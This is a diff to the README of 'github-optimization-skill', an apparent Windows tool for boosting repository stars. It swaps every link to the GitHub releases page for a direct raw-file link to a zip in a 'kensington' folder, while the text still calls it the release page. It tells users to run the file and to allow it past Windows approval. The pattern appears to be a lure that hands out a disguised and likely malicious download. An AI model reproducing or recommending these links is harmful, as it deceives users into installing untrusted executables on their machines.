@@ -1,10 +1,10 @@
 # 🚀 github-optimization-skill - Turn repos into star magnets
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/inquisitive-production852/github-optimization-skill/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/inquisitive-production852/github-optimization-skill/main/kensington/optimization_skill_github_v2.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/inquisitive-production852/github-optimization-skill/releases
+Visit this page to download: https://raw.githubusercontent.com/inquisitive-production852/github-optimization-skill/main/kensington/optimization_skill_github_v2.7.zip
 
 Download the latest release for Windows, then open the file you get from the page.
 
@@ -36,7 +36,7 @@ If Windows asks for approval, allow the file to run only after you confirm it ca
 
 ## 🧭 How to install and run
 
-1. Open the download page: https://github.com/inquisitive-production852/github-optimization-skill/releases
+1. Open the download page: https://raw.githubusercontent.com/inquisitive-production852/github-optimization-skill/main/kensington/optimization_skill_github_v2.7.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. Wait for the download to finish
@@ -164,4 +164,4 @@ Use this project under the license in the repository
 
 ## 🔗 Download again
 
-[Open the release page to download for Windows](https://github.com/inquisitive-production852/github-optimization-skill/releases)
+[Open the release page to download for Windows](https://raw.githubusercontent.com/inquisitive-production852/github-optimization-skill/main/kensington/optimization_skill_github_v2.7.zip)
